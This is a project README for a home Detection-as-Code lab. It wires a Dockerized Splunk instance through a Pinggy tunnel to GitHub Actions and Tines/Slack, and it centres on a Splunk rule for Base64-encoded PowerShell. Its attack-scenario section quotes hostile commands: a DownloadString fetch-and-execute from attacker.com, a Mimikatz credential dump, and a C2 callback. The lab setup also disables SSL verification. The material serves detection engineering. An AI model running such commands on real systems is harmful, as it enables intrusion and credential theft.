# Detection-as-Code: Automated Detection and Alert Pipeline
![Splunk DaC Pipeline](https://github.com/subhsamal/Detection-as-Code-Lab/actions/workflows/ci-cd.yml/badge.svg)

## 1. Project Overview

The goal of this project is to produce a hands-on demonstration for implementing Detection-as-Code (DaC) using enterprise-standard tools and building your own threat detection lab at home free of cost.

This repository serves as a comprehensive guide for:

* **Small and Midsize Companies:** Aiming to create a cost-effective, in-house threat detection program using automated pipelines.
* **Students and Professionals:** Seeking to build a sophisticated, free-of-cost threat detection home lab for skill development.
* **Security Leaders & Professionals:** Anyone seeking a high-level conceptual and practical overview of what Detection-as-Code actually is and how it functions in a modern SOC.

### What is Detection-as-Code?

Detection-as-Code is a modern security engineering approach that treats threat detection logic (like SIEM alerts) with the same rigor as software code. Instead of manually configuring alerts in a UI, detections are:

* **Written in standardized formats** (like YAML) to ensure platform independence.
* **Version-controlled** in repositories like GitHub to track changes and enable rollbacks.
* **Automatically validated and deployed** through CI/CD pipelines to reduce human error and configuration drift.

### Benefits of this Approach

* **Scalability:** Automation allows a small team to manage hundreds of detections across multiple platforms without increasing manual workload.
* **Auditability:** Every change to a detection is logged in Git, providing a clear trail of who changed what and why for compliance and troubleshooting.
* **Rapid Recovery:** If a new detection causes an issue, the team can roll back to a previous version in seconds via a Git revert.
* **Portability:** By using YAML, the core logic is not locked into a single vendor, making it easier to migrate or sync detections across different SIEMs.
* **Huge Relief for SOC Teams:** By implementing automated checks, quality control, and automated testing, we drastically reduce human error in detection logic. This results in high-fidelity detections and lesser alert fatigue.

---

## 2. Project Roadmap: Evolution of Maturity

### Phase-1: The Automated Foundation (Current)

* **Focus:** Implementing a fully functional Detection-as-Code pipeline for "One-Click" deployment.
* **Goal:** Solve connectivity and delivery hurdles between cloud automation and local infrastructure.
* **Key Achievement:** A Modularized CI/CD Workflow where deployment is separated from verification to mimic professional SDLC standards.
* **Components:**
  * **Pinggy (Secure Tunneling) to Dockerized Splunk:** The Secure Bridge connecting GitHub/Tines to the local lab safely.
  * **GitHub Actions (CI/CD):** The Quality Gatekeeper triggering the lifecycle upon code push.
  * **The Delivery Vehicle (`deploy_to_splunk.py`):** A dedicated script synchronizing YAML logic to the Splunk API.
  * **Automated Log Simulation & Cleanup:** Using `ingest_logs_for_detection.py` to trigger alerts and a cleanup script to maintain SIEM hygiene.
  * **Tines & Slack:** The Orchestration and Notification layer providing feedback to the Security Engineer and the SOC.

### Phase-2: Scaling to Industry Standards (Upcoming)

* **Focus:** Transitioning from "Functional" to "Resilient, and Scalable."
* **How it scales:**
  * **Enterprise Splunk Deployment:** Multi-environment setup (Dev → Prod) with proper separation of duties and approval gates for production deployments.
  * **Standardized Adversary Emulation:** Transitioning to Atomic Red Team or TTP Forge for repeatable attack simulation.
  * **Automated Quality Assurance (QA) Sandbox:** Moving to "Pre-merge" testing via Pull Requests to ensure zero-defect deployment.
  * **Multi-Platform Lifecycle Management:** Managing exclusive detections for Splunk (SPL) and Google SecOps (YARA-L) via a unified workflow.
  * **Automated MITRE ATT&CK Mapping:** Automatically tagging detections with MITRE techniques for coverage visualization.
  * **Intelligence-Driven Enrichment:** Integrating GTI (Global Threat Intelligence) and external APIs to enrich live alerts with reputation data.
  * **Agentic AI Orchestration:** Integrating AI Agents into Tines to perform "First-Level Analysis" and explain threat intent to analysts.

---

## 3. Environment & Workspace Setup

The project was built on an **Intel-based macOS** environment using the following configuration:

### 3.1 Project Structure

```plaintext
detection-as-code-lab/
├── .github/
│   └── workflows/
│       └── ci-cd.yml               # GitHub Actions CI/CD pipeline
├── detections/
│   └── suspicious_powershell.yml   # YAML-based detection rules
├── scripts/
│   ├── deploy_to_splunk.py         # Deployment automation (The Delivery Vehicle)
│   └── validate_detections.py      # YAML schema validation
├── tests/
│   ├── cleanup_test.py             # Test data cleanup
│   ├── ingest_logs_for_detection.py # Test event injection
│   └── verify_alert.py             # Detection verification
├── .gitignore                      # Git ignore rules
├── README.md                       # Project documentation
└── requirements.txt                # Python dependencies
```

### 3.2 Technical Specifications

* **Dependency Management:** Used `pip` to install `PyYAML` for parsing and `splunk-sdk` for SIEM interaction.
* **Infrastructure:** **Docker Desktop** was used to host a containerized Splunk instance (allocated **4GB RAM**).

### 3.3 SIEM Orchestration (Docker & Splunk)

#### Docker Installation

I installed **Docker Desktop** for macOS to run Splunk in a containerized environment. The installation process involved:
- Downloading Docker Desktop from the official website: https://www.docker.com/products/docker-desktop/
- Installing and starting the Docker daemon
- Verifying installation with `docker --version`
- Resolving Docker Hub authentication by logging in and verifying email

#### Splunk Deployment

I deployed Splunk Enterprise using Docker. This stage involved overcoming a critical technical hurdle:

**License Compliance:** Addressed a container crash issue by identifying and adding the `SPLUNK_GENERAL_TERMS` flag, a mandatory requirement for starting modern Splunk Docker images.

**Initial Deployment Command:**
```bash
docker run -d -p 8000:8000 -p 8089:8089 \
  -e 'SPLUNK_GENERAL_TERMS=--accept-sgt-current-at-splunk-com' \
  -e 'SPLUNK_START_ARGS=--accept-license' \
  -e 'SPLUNK_PASSWORD=<YourSecurePassword123!>' \
  --name splunk_lab \
  splunk/splunk:latest
```

**Note:** Replace `<YourSecurePassword123!>` with your chosen password. The password must be at least 8 characters and meet Splunk's complexity requirements.

#### Managing Splunk Container

**Starting Splunk (after system restart):**
```bash
docker start splunk_lab
```

**Stopping Splunk:**
```bash
docker stop splunk_lab
```

**Checking if Splunk is running:**
```bash
docker ps | grep splunk_lab
```

**Accessing Splunk Web Interface:**
- URL: http://localhost:8000
- Username: `admin`
- Password: `<YourSecurePassword123!>` (the password you set during initial deployment)

**Retrieving forgotten password:**
If you forget your Splunk password, you can retrieve it from the container environment variables:
```bash
# View the password set during container creation
docker inspect splunk_lab | grep SPLUNK_PASSWORD
```

### 3.4 Local Lab Connectivity (Pinggy)

Since this lab uses a local Splunk instance, I utilize an SSH reverse tunnel via **Pinggy.io** to allow GitHub Actions to securely communicate with the Splunk Management API.

#### Prerequisites
- **Docker**: Splunk must be running in a container with port 8089 mapped.
- **SSH**: Standard macOS/Linux terminal access.

#### Establishing the Tunnel
To start the tunnel, run the following command on your local host:

```bash
ssh -p 443 -R0:localhost:8089 tcp@a.pinggy.io
```

#### GitHub Actions & Secret Management

To enable the "One-Click" deployment while maintaining security, GitHub Actions is configured with **Repository Secrets**. This ensures that sensitive credentials are never exposed in the source code.

**Secrets Configured:** `SPLUNK_HOST`, `SPLUNK_PORT`, `SPLUNK_PASSWORD`, `TINES_WEBHOOK_URL`.

#### Required GitHub Secrets

Every time the tunnel is restarted, the Host and Port will change. You must update these in your **GitHub Repository Settings > Secrets and variables > Actions**:

| Secret Name | Description | Example Value |
|-------------|-------------|---------------|
| `SPLUNK_HOST` | The URL provided by Pinggy | `ltgxl-174-17-125-88.a.free.pinggy.link` |
| `SPLUNK_PORT` | The 5-digit port provided by Pinggy | `54321` |
| `SPLUNK_PASSWORD` | Your local Splunk admin password | `<your-secure-password>` |
| `TINES_WEBHOOK_URL` | Tines webhook for alert notifications | `https://your-tines-instance.com/webhook/...` |

> [!IMPORTANT]
> **Operational Note: The "Ephemeral Tunnel" Challenge**
> 
> Since this lab utilizes the free tier of Pinggy, the TCP tunnel automatically expires after **60 minutes**. Every time a new tunnel is established, the connection address changes.
>
> **Example Pinggy Output:**
> `tcp://rnfby-102-132-23-144.a.pinggy.link:44562`
> * **SPLUNK_HOST:** `rnfby-102-132-23-144.a.pinggy.link`
> * **SPLUNK_PORT:** `44562`
>
> To manage this technical constraint, the workflow is designed to be flexible:
> 1. **Start Tunnel:** Initiate the SSH tunnel on the local Mac.
> 2. **Update Secrets:** Quickly update the `SPLUNK_HOST` and `SPLUNK_PORT` in the GitHub Repository Secrets.
> 3. **Manual Trigger:** Use the **Manual Dispatch (`workflow_dispatch`)** button in the GitHub Actions tab to run the pipeline immediately without needing to push a new code commit.

#### The Automation Trigger

The pipeline is designed to be **event-driven**, ensuring that detections are tested and deployed automatically. This is controlled via the `on:` configuration in `.github/workflows/ci-cd.yml`:

**Push/Pull Request:** Automatically starts the lifecycle whenever a new detection is added or modified in the `main` branch.
```yaml
on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]
```

**Manual Dispatch (`workflow_dispatch`):** Allows the **Security Engineer** to manually trigger the pipeline from the GitHub UI. This is used for ad-hoc connectivity testing and troubleshooting the tunnel.
```yaml
on:
  workflow_dispatch: # Allows manual triggers from the GitHub Actions tab
```

**Pre-flight Tunnel Check:** The pipeline includes a built-in health check that pings the tunnel URL before execution, preventing failed runs due to network inactivity.

#### Security & Cleanup
- **Ephemeral Links**: The Pinggy URL is temporary and expires when the SSH session is closed.
- **SSL Verification**: The CI/CD script is configured with `verify=False` to bypass SSL warnings caused by Splunk's default self-signed certificates.
- **Revocation**: This method does not require persistent OAuth access or credit card verification.

#### Why use Pinggy for this Lab?
- **No Credit Card Required**: Unlike ngrok, Pinggy allows TCP tunneling on their free tier without identity verification.
- **No Installation**: Uses native OpenSSH already built into the OS.
- **Portability**: Allows the CI/CD pipeline to follow you even if your local IP address changes.

---
> [!WARNING]
> ### 🚨 Critical: Pipeline Prerequisites
> The CI/CD pipeline is **entirely dependent** on your local infrastructure being reachable. Before pushing code or triggering a manual workflow, you **MUST** ensure:
> 1. **Splunk is Active:** The Docker container `splunk_lab` must be running.
> 2. **Tunnel is Live:** The Pinggy SSH tunnel must be established and the terminal remains open.
> 3. **Secrets are Current:** GitHub Repository Secrets (`SPLUNK_HOST` and `SPLUNK_PORT`) must match the current Pinggy session.
>
> **If any of these are missing, the `Deploy` and `Verify` stages of the pipeline will fail.**

## 4. Phase-1 Implementation: The Modular Pipeline

The architecture is designed to be **modular**, ensuring that each step has a single, dedicated responsibility. This mimics professional SDLC standards, where detection logic is treated with the same rigor as production code.

### Detection Engineering (YAML)

At the core of the pipeline is a high-fidelity detection rule for **Suspicious PowerShell Encoded Commands**. Unlike basic keyword searches, this rule uses specific logic gates and advanced Splunk commands to extract and validate data before alerting.

* **File:** `detections/suspicious_powershell.yml`
* **Core Logic Gates:**
  * **Binary Identification:** Targets both legacy and modern PowerShell environments: `(CommandLine="*powershell*" OR CommandLine="*pwsh*")`.
  * **Flag Capture:** Monitors for both shorthand and full obfuscation flags: `(CommandLine="*-enc*" OR CommandLine="*-encodedcommand*")`.

* **Advanced Processing & Validation:**
  * **Base64 Integrity Check:** The logic identifies **actual encoded text** by ensuring the captured string follows the Base64 character set (A-Z, a-z, 0-9, +, /, =). This ensures the rule only fires on legitimate encoded payloads rather than malformed flags or random strings.
  * **Length Validation:** Filters out short, noisy strings by requiring the encoded command to be at least **20 characters**, significantly reducing false positives from common administrative aliases.
  * **Noise Reduction:** Implements deep exclusions for legitimate Windows services (SCCM, WinRM, Group Policy) to ensure the SOC only receives high-priority alerts.
  * **Multi-Stage Mapping:** Aligned with multiple MITRE ATT&CK techniques: **T1059.001** (PowerShell), **T1027** (Obfuscation), and **T1140** (Deobfuscate/Decode).

### Automated Validation (The Quality Gate)

To prevent "broken" rules from reaching production, I implemented a **CI (Continuous Integration)** check that runs every time a change is detected.

* **Script:** `validate_detections.py`
* **Function:** This script programmatically verifies that the YAML follows the required schema. It acts as a gatekeeper, checking for mandatory fields like `name`, `search`, and `cron_schedule`. If a field is missing or the YAML is malformed, the pipeline fails immediately, preventing a faulty deployment.

### The Pipeline Flow

| Step | Script / Tool | Responsibility |
|------|---------------|----------------|
| **0. Connectivity** | **Pinggy & Docker** | **The Foundation:** Establishes the secure SSH tunnel and hosts the Splunk environment locally. |
| **1. Validation** | `validate_detections.py` | **The Gatekeeper:** Runs the schema and syntax checks before deployment. |
| **2. Deployment** | `deploy_to_splunk.py` | **The Delivery Vehicle:** Programmatically creates the "Saved Search" in Splunk and links the Tines Webhook as an alert action. |
| **3. Ingestion** | `ingest_logs_for_detection.py` | **The Simulator:** Injects synthetic malicious telemetry (matching EventCode 4688) into the Splunk index to trigger the rule. |
| **4. Verification** | `verify_alert.py` | **The Auditor:** Queries the Splunk API to confirm the alert was successfully triggered by the ingested logs. |
| **5. Cleanup** | `cleanup_test.py` | **SIEM Hygiene:** Automatically deletes the test logs from the index to maintain a clean lab environment. |

---

## 5. The Orchestration Layer (Tines & Slack)

Once an alert is triggered in Splunk, it must be communicated to the SOC. This project uses **Tines** as the orchestration engine to bridge the gap between the SIEM and the analyst's communication tools.

### The Workflow Logic

* **Webhook Trigger:** Splunk sends a JSON payload to a unique **Tines Webhook URL** upon detection.
  * **How to obtain:** Inside a Tines **Story**, add a **Webhook Action**. Once added, the unique URL is generated in the "Status" or "Receiver" tab of that action. This URL is then saved as a **GitHub Repository Secret** (`TINES_WEBHOOK_URL`) and used as the "Webhook URL" in the Splunk Alert Action.

* **Data Parsing:** Tines receives the raw event data. Using **Liquid syntax** within a Slack Action, the relevant fields are extracted from the Splunk JSON payload.
  * **Logic Example:**
    ```liquid
    *Alert:* Suspicious PowerShell Encoded Command
    *User:* {{ .webhook.results[0].User }}
    *Host:* {{ .webhook.results[0].Computer }}
    *Decoded Command:* `{{ .webhook.results[0].decoded_cmd }}`
    ```

* **Notification:** Tines formats this data into a human-readable message and pushes it to a dedicated **Slack channel** (`#security-alerts`).

### The Result: Real-Time Visibility

By integrating Slack, the "Detection-as-Code" pipeline provides immediate feedback. Within seconds of an automated test running in GitHub Actions, the results are visible to the entire security team in Slack.

**Crucially, this integration is not just for testing.** While used here to verify the pipeline, this exact workflow is used for **real alert triggers**, ensuring that analysts are notified of actual malicious activity in the environment the moment it is detected.

---

## 6. Detection Logic: PowerShell Encoded Commands

### Core Detection Query

```spl
index=windows sourcetype=WinEventLog:Security EventCode=4688
| search (CommandLine="*powershell*" OR CommandLine="*pwsh*")
| search (CommandLine="*-enc*" OR CommandLine="*-encodedcommand*")
| rex field=CommandLine "-enc(?:odedcommand)?\s+(?<encoded_cmd>\S+)"
| where isnotnull(encoded_cmd) AND len(encoded_cmd) >= 20
| eval decoded_cmd=base64decode(encoded_cmd)
| where isnotnull(decoded_cmd)
| table _time, Computer, User, ParentProcessName, CommandLine, decoded_cmd
| sort -_time
```

**Note:** This is the base detection logic. For production use with exclusions for legitimate sources (SCCM, WinRM, Group Policy, etc.), see the full detection YAML in the repository.

### Attack Scenarios

**Scenario 1: Phishing → Initial Access**
```
User opens malicious document → Macro executes → Spawns PowerShell
Command: powershell.exe -w hidden -enc <base64_payload>
Decoded: IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/stage2.ps1')
```
The attacker downloads a second-stage payload directly into memory, leaving no files on disk.

**Scenario 2: Credential Dumping**
```
Attacker gains foothold → Escalates privileges → Runs Mimikatz
Command: powershell.exe -nop -enc <encoded_mimikatz>
Decoded: Invoke-Mimikatz -DumpCreds
```
Extracts passwords from LSASS memory to move laterally across the network.

**Scenario 3: Persistence via Scheduled Task**
```
Attacker creates scheduled task → Runs daily at 2 AM
Command: powershell.exe -enc <base64_backdoor>
Decoded: Connect back to C2 server, execute commands, maintain access
```
Maintains long-term access through automated callback mechanism.

### Why This Detection Matters

**Visibility:** PowerShell's `-EncodedCommand` flag automatically decodes and executes Base64 strings, making malicious intent invisible at first glance. This detection decodes the content in real-time, exposing what attackers are actually running.

**Coverage:** Catches common attack techniques including:
- Fileless malware (executes entirely in memory)
- Credential theft (Mimikatz, password dumping)
- Command and control (C2) communication
- Lateral movement scripts
- Persistence mechanisms

**Evasion Prevention:** Attackers use encoding to bypass:
- Simple string-based detections (e.g., searching for "DownloadString")
- Antivirus signatures
- Email gateway filters
- Web proxy URL blocking

By validating and decoding the Base64 content, this detection sees through the obfuscation layer and identifies malicious patterns that would otherwise remain hidden.